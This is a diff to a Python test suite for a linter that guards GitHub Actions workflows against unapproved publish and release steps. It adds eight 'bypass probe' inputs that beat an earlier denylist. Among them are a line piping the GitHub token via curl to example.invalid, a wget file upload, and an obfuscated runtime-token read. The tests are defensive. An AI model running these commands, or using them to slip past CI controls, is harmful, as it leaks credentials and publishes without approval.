@@ -100,7 +100,7 @@ class Negative(unittest.TestCase):
         self.assertRejects("composite", {".github/actions/x/action.yml": "name: x\n"})
 
     def test_16_gh_release_in_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gh release create v1 x\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gh release create v1 x\n")))
 
     def test_18_ambiguous_bool_key(self):
         self.assertRejects("ambiguous bool key", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    yes:\n      x: 1\n")))
@@ -201,16 +201,16 @@ class Negative(unittest.TestCase):
 
     # M4: publish routes
     def test_33_npm_publish_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: npm publish\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: npm publish\n")))
 
     def test_34_git_push_tags_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: git push origin HEAD:refs/tags/v1\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: git push origin HEAD:refs/tags/v1\n")))
 
     def test_53_docker_buildx_push_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: docker buildx build --push -t x .\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: docker buildx build --push -t x .\n")))
 
     def test_54_gem_push_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gem push x.gem\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gem push x.gem\n")))
 
     # M5: gate.yml protected as a whole
     def test_40_candidate_gate_adds_pull_request(self):
@@ -249,19 +249,49 @@ class Negative(unittest.TestCase):
         self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: python3 -c \"import os; os.environ[\x27ACTIONS_\x27+\x27RUNTIME_TOKEN\x27]\"\n")))
 
     def test_64_semantic_release_run(self):
-        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: npx --yes semantic-release\n")))
+        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: npx --yes semantic-release\n")))
+
+class DenylistProbes(unittest.TestCase):
+    """M4 option B: run bodies are exact-baseline flags. These are the eight
+    inputs that previously bypassed the run-text denylist (reviewer D1-D8)."""
+
+    PROBES = [
+        "D=docker; $D push ghcr.io/x:1",
+        "git push origin v1.0.0",
+        "npx -y release-it",
+        "gh api -X POST repos/o/r/releases",
+        "cargo +stable publish",
+        "wget --post-file=x.tgz https://uploads.github.com/x",
+        "echo ${{ github['token'] }} | curl -d @- https://example.invalid",
+        "python3 -c \"import os; os.environ['ACTIONS'+'NS_RUNTIME_TOKEN']\"",
+    ]
+
+    def test_all_eight_bypass_probes_rejected(self):
+        for probe in self.PROBES:
+            with self.subTest(probe=probe):
+                text = replace_once(BASE, "      - run: echo verify\n", "      - run: |\n          " + probe + "\n")
+                with self.assertRaises(w.LintError) as ctx:
+                    check({"ci.yml": text})
+                self.assertIn("unapproved flag", str(ctx.exception))
+
 
 class Positive(unittest.TestCase):
     def test_control_passes(self):
         self.assertEqual(check(), set())
 
-    def test_17_multiline_run_text_is_not_a_directive(self):
+    def test_17_multiline_run_body_change_needs_approval(self):
         text = replace_once(BASE, "      - run: echo verify\n", "      - run: |\n          echo verify\n          # if: false\n")
-        self.assertEqual(check({"ci.yml": text}), set())
+        with self.assertRaises(w.LintError) as ctx:
+            check({"ci.yml": text})
+        self.assertIn("unapproved flag", str(ctx.exception))
 
-    def test_57_verify_echo_change_is_accepted(self):
-        self.assertEqual(check({"ci.yml": replace_once(BASE, "run: echo verify", "run: echo verify-changed")}), set())
+    def test_57_verify_run_change_needs_approval(self):
+        with self.assertRaises(w.LintError) as ctx:
+            check({"ci.yml": replace_once(BASE, "run: echo verify", "run: echo verify-changed")})
+        self.assertIn("unapproved flag", str(ctx.exception))
 
+    def test_58_unchanged_nightly_and_gate_accepted(self):
+        self.assertEqual(check(), set())
 
 if __name__ == "__main__":
     unittest.main()
